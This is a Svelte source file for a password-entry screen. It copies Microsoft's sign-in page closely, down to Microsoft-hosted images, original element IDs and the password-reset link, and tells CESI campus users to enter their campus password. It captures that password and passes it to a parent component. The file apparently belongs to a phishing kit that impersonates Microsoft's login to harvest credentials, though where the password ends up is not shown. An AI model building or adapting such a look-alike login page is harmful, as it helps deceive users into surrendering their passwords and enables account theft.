<script>
  export var login;

  import { createEventDispatcher } from "svelte";
  const dispatch = createEventDispatcher();

  var password;
  var error = false;

  function onBack() {
    dispatch("back");
  }

  function onNext() {
    if (!!password && password.length >= 8) {
      error = false;
      dispatch("next", { password });
    } else {
      error = true;
    }
  }

  function handleKeyup() {
    if (event.code == "Enter") {
      event.preventDefault();
      onNext();
    }
  }
</script>

<div role="main">
  <div>
    <div class="animate slide-in-next">
      <div>
        <div class="identityBanner">
          <button
            type="button"
            class="backButton"
            id="idBtn_Back"
            on:click={onBack}
            aria-label="Back">
            <img
              role="presentation"
              alt="CESi"
              src="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" />
          </button>
          <div id="displayName" class="identity" title={login}>{login}</div>
        </div>
      </div>
    </div>
    <div class="pagination-view animate has-identity-banner slide-in-next">
      <div
        data-viewid="2"
        data-showidentitybanner="true"
        data-dynamicbranding="true">
        <div
          id="loginHeader"
          class="row title ext-title"
          role="heading"
          aria-level="1">
          Enter password
        </div>
        <div class="row">
          <div class="form-group col-md-24">
            <div role="alert" aria-live="assertive" />

            {#if error}
              <div class="col-md-24 error ext-error" id="usernameError">
                Please enter your password.
              </div>
            {/if}

            <div class="placeholderContainer">
              <input
                name="passwd"
                type="password"
                id="i0118"
                bind:value={password}
                on:keyup|preventDefault={handleKeyup}
                class:has-error={error}
                autocomplete="off"
                class="form-control input ext-input text-box ext-text-box"
                aria-required="true"
                aria-describedby="loginHeader "
                placeholder="Password"
                tabindex="0" />
            </div>
          </div>
        </div>
        <div>
          <div>
            <div class="row">
              <div class="col-md-24">
                <div class="text-13">
                  <div class="form-group">
                    <a
                      id="idA_PWD_ForgotPassword"
                      role="link"
                      href={'https://passwordreset.microsoftonline.com/?username=' + login}>
                      Forgot my password
                    </a>
                  </div>

                  <div class="form-group" />
                </div>
              </div>
            </div>
          </div>
          <div class="win-button-pin-bottom">
            <div class="row move-buttons">
              <div>
                <div class="col-xs-24 no-padding-left-right button-container">
                  <div class="inline-block">
                    <button
                      type="button"
                      id="idSIButton9"
                      on:click={onNext}
                      class="button ext-button primary ext-primary">
                      Sign in
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div
          id="idBoilerPlateText"
          class="wrap-content boilerplate-text ext-boilerplate-text">
          <p>Utilisez votre identifiant de votre campus Cesi</p>
        </div>
      </div>
    </div>
  </div>
</div>
